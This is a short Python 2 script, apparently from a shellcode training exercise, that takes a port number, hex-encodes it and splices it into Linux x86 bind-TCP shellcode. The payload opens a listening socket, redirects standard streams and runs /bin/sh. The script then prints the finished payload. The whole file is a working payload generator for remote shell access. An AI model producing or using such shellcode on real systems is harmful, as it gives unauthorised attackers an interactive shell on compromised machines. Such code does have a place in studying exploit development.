#!/usr/bin/env python

'''
Author 	: RIZAL MUHAMMED (UB3RSiCK)
Desc	: port-config-shell-bind-tcp.py
'''

import socket
import sys

if len(sys.argv) != 2:
	print "Usage: {} Port".format(sys.argv[0])
	sys.exit()

port = int(sys.argv[1])

# Check if user has passed invalid port number
if port < 1000 or port > 65535 :
	print "Either port number less than 1000: user needs to be root"
	print "Or"
	print "Port number greater than 65535"
	sys.exit()

hex_port = hex(port)[2:]

if len(hex_port) < 4:
	# for all port number > 1000, len(hex(port)) will be 3 or more, not less than that
	hex_port = "0" + hex_port

h1 = hex_port[:2]
h2 = hex_port[2:]

if h1 == "00" or h2 == "00":
	print "port number contain null byte, please choose different port number"
	sys.exit()


port_no = '\\x'+h1+'\\x'+h2

print 'Port: {0} , Hex = {1}, inShellcode = {2}'.format(port, hex_port, port_no)

shellcode = (
	"\\x31\\xc0\\x50\\xb0\\x66\\x6a\\x01\\x5b\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x5b\\x5e\\x96\\xb0\\x66\\x66\\x68"+
	port_no+	# this is the place where we need to place our port number
	"\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x31\\xff\\x57\\x56\\x89\\xe1\\xcd"+
	"\\x80\\xb0\\x66\\x43\\x57\\x57\\x56\\x89\\xe1\\xcd\\x80\\x93\\x31\\xc0\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49"+
	"\\x79\\xf9\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1"+
	"\\xb0\\x0b\\xcd\\x80")


print '"'+shellcode+'"'
